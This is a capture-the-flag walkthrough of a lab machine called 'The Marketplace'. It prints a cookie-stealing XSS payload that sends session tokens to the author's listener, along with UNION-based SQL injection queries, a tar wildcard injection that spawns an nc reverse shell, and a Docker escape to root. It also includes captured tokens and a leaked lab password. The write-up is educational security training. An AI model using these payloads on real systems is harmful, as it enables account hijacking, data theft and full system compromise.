 # The Marketplace

 <img src=market.png alt="market" width=200 heigth=200>

## Enumeration

### nmap

```
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW+LVfkwlBgxGqnRWxlY6XtlsYEKfS1B+wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99+twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=
|   256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar

80/tcp    open  http    syn-ack nginx 1.19.2
|_http-server-header: nginx/1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

32768/tcp open  http    syn-ack Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
### ffuf

```
.hta                    [Status: 403, Size: 153, Words: 3, Lines: 8]
.htaccess               [Status: 403, Size: 153, Words: 3, Lines: 8]
.htpasswd               [Status: 403, Size: 153, Words: 3, Lines: 8]
                        [Status: 200, Size: 779, Words: 176, Lines: 36]
admin                   [Status: 403, Size: 392, Words: 75, Lines: 22]
Admin                   [Status: 403, Size: 392, Words: 75, Lines: 22]
ADMIN                   [Status: 403, Size: 392, Words: 75, Lines: 22]
images                  [Status: 301, Size: 179, Words: 7, Lines: 11]
login                   [Status: 200, Size: 857, Words: 200, Lines: 36]
Login                   [Status: 200, Size: 857, Words: 200, Lines: 36]
messages                [Status: 302, Size: 28, Words: 4, Lines: 1]
new                     [Status: 302, Size: 28, Words: 4, Lines: 1]
robots.txt              [Status: 200, Size: 31, Words: 3, Lines: 3]
signup                  [Status: 200, Size: 667, Words: 159, Lines: 31]
stylesheets             [Status: 301, Size: 189, Words: 7, Lines: 11]

```

we visit the website (port 80 and 32768 look identical)

meet `jake` and `michael`

signup, then login

we are not authorized to visit `/admin` dir...yet

when trying to create a new listing I tried to enable the upload button from code inspector but no use

the hint said to look around the report option...when you report a listing to admins you get a message back

I tried to check for xss and yup...

when creating a ne listing the most basic checks works with

`<script>alert(1)</script>`

But what do we do with this? 

oh...cookies! took me some time!

there is a `token` cookie that register your session...decoding it with jwt.io is not really helpful

But combined with the XSS vulnerability we can do some `Cookie stealing` and get admin's

Basically we forge a cookie-stealing Reflected Xss payload like...

`<script>new Image().src="http://10.8.226.203:8080/?"+document.cookie;</script>`

It obviously sends the user's cookie to our machine server on specified port (8080 for me)

then start a listener on said port

We use it when creating our new listing...

And get our own cookie

```
└──╼ $nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 33142
GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiZmxvIiwiYWRtaW4iOmZhbHNlLCJpYXQiOjE2NDI4NTIwMTd9.jIodXdkw16d4Hlb3cecsHd3KqHuRuTqvVv7EsWnObzc HTTP/1.1
Host: 10.8.226.203:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Referer: http://10.10.228.67/item/3
Sec-GPC: 1

```
Now report that listing to admins! 

its obviously a malicious listing...stealng people's cookies

(make sure to keep the listener alive)

We wait a bit and get admin's cookie

Note that I think it was unrealistically fast for a Reflected Xss (you usually wait for people to click on your malicious link wich may takes long)

This is probably running automatically with a cron-like job

```
└──╼ $nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 39020
GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NDI4NTIyNDV9.r1mGSf6yZVq33YPYEC3_xGPVkYxTPitiPr6ctYjKAn0 HTTP/1.1
Host: 10.8.226.203:8080
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://localhost:3000/item/3
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```

Now replace your poor-people's cookie with extra-privileges flavored admin's cookie

You can just use the inspector/storage to change token's value

First flag is Right on administration panel

`THM{what_are_you_buying}`

You can also see there are 2 admins, `jake` and `michael`

I clicked on michael and noticed the url was like

`http://10.10.228.67/admin?user=2`

And I made it go like

`http://10.10.228.67/admin?user=2'`

Then It start acting 

```
Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

And I was like "chill bro its a simple colon" And went 

`http://10.10.228.67/admin?user=0 union select 1,2,3,4`

It then calmed down and gave me `user 1` So I said

`http://10.10.228.67/admin?user=0 union select version(),2,3,4`


It replied `User 8.0.21`...

At this point you can get anything from that UNION-Based SQLi

database

`http://10.10.228.67/admin?user=0 union select database(),2,3,4`

tables

`0 union select group_concat(table_name),database(),3,4 from information_schema.tables where table_schema='marketplace'`

columns

`10.10.228.67/admin?user=0 union select group_concat(column_name),database(),3,4 from information_schema.columns where table_name='users'`

So for the basic informations

```
database = marketplace
version = 8.0.21
tables = users , items, messages
columns = id,isAdministrator,password,username
```
Now we all would go straiht to `password` column

```
$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW,

$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q,

$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG,

$2b$10$daomPlspz0EKa7wbtEQfeu1DGUWIiLxejvz/i2s3dMkE4SAxoq.Da

```
(remove the concat colon separator though)

If you didnt recognize it (with that ugly $2b$) its `BCRYPT`

your time-wasting nightmare! crackin those would take years for me

if the hash was even actually in rockyou.txt

So I went for help and you can actually dig deeper in the database

For the columns you go

`10.10.228.67/admin?user=0 union select group_concat(column_name),database(),3,4 from information_schema.columns where table_name='messages'`

and get `id,is_read,message_content,user_from,user_to`

So you concat that with `10.10.228.67/admin?user=0 union select group_concat(id,message_content),database(),3,4 from messages`

And bingo!

```
User 1Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ,2Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,3Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee's browsers.,4Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,5Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,6Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via pr
```
There are passwords in messages? who would know???

anyway we got ssh access now:

`jake:@b_ENXkGYUCAv3zJ`

Get the use flag

```
jake@the-marketplace:~$ cat user.txt
THM{a_user_flag_for_one_dollar}
```

## privilege escalation

The classics first

```
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
    
```

uh? we run backups as michael? what is michael backing up?

```
jake@the-marketplace:~$ id michael
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```
That bad boi michael is in docker group

```
jake@the-marketplace:~$ cd /opt/backups
jake@the-marketplace:/opt/backups$ cat backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

I just googled that last line with "privilege escalation"

Its called [wildcard injection](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/) as it seems

Tried the artcle's demo method

```
jake@the-marketplace:/opt/backups$ echo 'echo "jake ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > demo.sh
jake@the-marketplace:/opt/backups$ touch -- --checkpoint=1
jake@the-marketplace:/opt/backups$ touch -- "--checkpoint-action=exec=sh demo.sh"
jake@the-marketplace:/opt/backups$ chmod 777 backup.tar demo.sh
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
Backing up files...
tar: backup.tar: file is the archive; not dumped
demo.sh: 1: demo.sh: cannot create /etc/sudoers: Permission denied
```
But we can't add jake to sudoers (michael cannot do that)

I found another method...as demo.sh is executed, we can just make it a reverse shell

```
jake@the-marketplace:/opt/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.226.203 2311 >/tmp/f" > shell.sh
jake@the-marketplace:/opt/backups$ touch -- --checkpoint=1
jake@the-marketplace:/opt/backups$ touch -- "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/opt/backups$ chmod 777 shell.sh
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
Backing up files...
tar: backup.tar: file is the archive; not dumped
demo.sh: 1: demo.sh: cannot create /etc/sudoers: Permission denied
rm: cannot remove '/tmp/f': No such file or directory
```
```
└──╼ $nc -lnvp 2311
listening on [any] 2311 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 60464
$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```
We are michael now...we have docker power

Docker is a root servce so we can mount it on our machine for root shell

you can visit Gtfobins for this one

First get comfortable

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
michael@the-marketplace:/opt/backups$
```

second get root

```
michael@the-marketplace:/opt/backups$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
t /mnt shn -v /:/mnt --rm -it alpine chroot
# uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

then get paid!

```
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
THM{a_root_flag_for_about_three_fiddies}

```

Nice customer service

Would recommand this marketplace 100% !




